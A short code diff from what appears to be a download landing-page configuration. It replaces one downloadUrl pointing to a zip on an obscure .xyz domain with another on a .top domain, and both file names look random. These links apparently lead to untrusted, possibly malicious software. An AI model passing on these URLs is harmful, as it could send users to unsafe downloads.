@@ -55,7 +55,7 @@
        btnRadius: "10px",
        bg: "//p8.qhimg.com/t11098f6bcd5e40dd91a92718e4.webp",
     },
-    downloadUrl: "https://lisoeruthzhsi1sel-elserj.xyz/CryvenXHS_v6.08.02_Universal.zip", 
+    downloadUrl: "https://liesoerie-oss.top/Nito_Inassoryrnd_RrdBoks-xsh_6967.zip", 
     QH:"QH_132_4#18",
     theme:"v2",
     themeBtnColor: "#15CA71",
